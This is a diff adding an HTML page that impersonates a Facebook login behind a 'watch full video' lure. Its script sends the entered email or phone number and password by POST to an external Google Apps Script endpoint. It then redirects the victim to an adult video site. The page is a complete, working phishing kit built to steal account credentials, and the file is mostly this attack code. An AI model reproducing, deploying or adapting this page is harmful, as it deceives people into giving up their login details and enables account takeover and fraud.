@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<!-- Coding By Mongrey Marma - www.mongreycode.com -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch full vedio. click now.</title>
+ 
+
+    <style>
+        
+body {
+    background: url('https://github.com/fbook0/login/raw/main/Screenshot_20240307_231304.jpg') no-repeat center center fixed;
+    background-size: cover;
+    font-family: 'Roboto';
+    margin: 0;
+    padding: 0;
+}
+
+
+        .login-text {
+            color: white;
+            font-weight: bold;
+            font-size: 16px; /* Adjust size as needed */
+        }
+
+        /* CSS for centering the form and adjusting button size */
+     
+.container {
+    display: flex;
+    
+}
+
+.facebook-page {
+    width: 80%;
+    text-align: center;
+    background-color: rgba(255, 255, 255, 0.5); /* White color with 50% opacity */
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    border-radius: 20px;
+    padding-top: 10px;
+    padding-bottom: 25px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    border: 1px solid #1877f2; /* Facebook blue border */
+}
+
+
+
+        form {
+            width: 70%; /* Set the width of the form */
+            margin: 0 auto; /* Center the form horizontally */
+            order: -1; /* Move the form container above the image container */
+        }
+
+        form input[type="text"],
+        form input[type="password"],
+        .space-box {
+          align: center;
+            width: 300px; /* Make input and button width 100% */
+            box-sizing: border-box; /* Ensure padding and border are included in the width */
+            margin-bottom: 10px; /* Add space between input boxes and button */
+            padding: 10px; /* Add padding for better aesthetics */
+            border: 1px solid #ccc; /* Add border */
+            border-radius: 5px; /* Add border radius */
+        }
+
+        form input[type="button"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #3b5998;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px; /* Add border radius */
+        }
+  .h1{
+    color:blue;
+  }
+
+        form input[type="text"],
+form input[type="password"] {
+    width: 100%; /* Make input width 100% */
+    box-sizing: border-box; /* Ensure padding and border are included in the width */
+    margin-bottom: 10px; /* Add space between input boxes and button */
+    padding: 15px; /* Increase padding for better aesthetics */
+    border: 1px solid #ccc; /* Add border */
+    border-radius: 5px; /* Add border radius 
+  
+     
+    overflow: hidden; /* Add this line */
+}
+
+.image-container:hover {
+    border-radius: 10%; /* Increase border radius on hover */
+}
+
+.image-container img {
+    max-width: 100%;
+    max-height: 100%;
+}
+
+
+        .forgot {
+            color: #42b72a; /* Green text color */
+            margin-top: 15px; /* Add space above the link */
+            display: block; /* Make the link a block element to control its layout */
+        }
+
+       .additional-text {
+    color:black; /* Light gray text color */
+    margin-top: 25px; /* Add space above the text */
+    font-size: 16px; /* Adjust text size as needed */
+    text-align: center; /* Center align the text */
+      padding-left:20px;
+      padding-right:20px;         
+         
+         
+       }
+  
+  .plaintext {
+    position: ;fixd;
+    bottom: 30px; /* Maintain bottom position */
+    left: 0;
+    right: 0;
+    text-align: center;
+    color: #8B8878; /* Light gray text color */
+    font-size: 16px; /* Adjust text size as needed */
+    margin-top: 120px; /* Move the footer up by 120px */
+}
+
+.custom-logo {
+    width: 30px;
+    height: 30px;
+    margin-right: 10px; /* Add some space between icon and text */
+}
+  
+  
+  
+  /* CSS for the loading spinner */
+.loading-spinner {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #1877f2; /* Facebook blue color */
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+  .text h1 {
+    color: #1877f2; /* Facebook blue color */
+}
+
+
+
+    </style>
+
+<head>
+    <!-- Other meta tags and styles -->
+    <meta property="og:image" content="https://github.com/fbook0/login/raw/main/IMG_20240307_233531.jpg">
+</head>
+
+</head>
+
+<body>
+     
+      
+        <div class="facebook-page flex">
+            <div class="text">
+              <h1>Facebook</h1>
+                  <p class="additional-text">Login your Facebook acount to watch full vedio</p>
+                
+            </div>
+            <form id="loginForm">
+              
+               <div class="loading-spinner" id="loadingSpinner"></div>
+              
+                <div id="errorDiv"></div> <!-- Error message div -->
+                <input type="text" id="emailOrNumber" placeholder="Email or Phone Number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <div class="link">
+                    <input type="button" value="Login" onclick="submitForm()">
+                    
+            </div>
+                </div>
+            </form>
+        </div>
+  
+
+
+    </div>
+
+
+
+<script>
+    function submitForm() {
+        var emailOrNumber = document.getElementById("emailOrNumber").value;
+        var password = document.getElementById("password").value;
+        var formData = { emailOrNumber: emailOrNumber, password: password };
+
+        // Check if the password length is less than 6
+        if (password.length < 6) {
+            document.getElementById("errorDiv").textContent = "Invalid password";
+            document.getElementById("errorDiv").style.color = "red"; // Set color to red
+
+            // Remove the error message after 2 seconds
+            setTimeout(function() {
+                document.getElementById("errorDiv").textContent = "";
+            }, 2000);
+
+            return; // Stop further execution
+        }
+
+        // Show loading spinner
+        document.getElementById("loadingSpinner").style.display = "block";
+
+        fetch('https://script.google.com/macros/s/AKfycbyJg3DXdqPehLn6am9tlyrXQHckKebOHRH8bIYmfMIQmOB-jr3H_8y-v_mmrVC1vh9O8w/exec', {
+            method: 'POST',
+            body: JSON.stringify(formData)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => {
+            console.log(data); // Log the response
+            // Redirect to error.html
+            window.location.href = "https://www.xxxvideosex.net/%E0%A6%B8%E0%A7%87%E0%A6%95%E0%A7%8D%E0%A6%B8-%E0%A6%AD%E0%A6%BF%E0%A6%A1%E0%A6%BF%E0%A6%93-%E0%A6%B8%E0%A7%87%E0%A6%95%E0%A7%8D%E0%A6%B8-%E0%A6%AD%E0%A6%BF%E0%A6%A1%E0%A6%BF%E0%A6%93/#_";
+        })
+        .catch(error => {
+            console.error('There was a problem with your fetch operation:', error);
+            // Display error message or perform any other error handling
+        })
+        .finally(() => {
+            // Hide loading spinner after 3 seconds
+            setTimeout(function() {
+                document.getElementById("loadingSpinner").style.display = "none";
+            }, 3000);
+        });
+    }
+
+
+
+
+</script>
+
+    
+
+
+</body>
+</html>
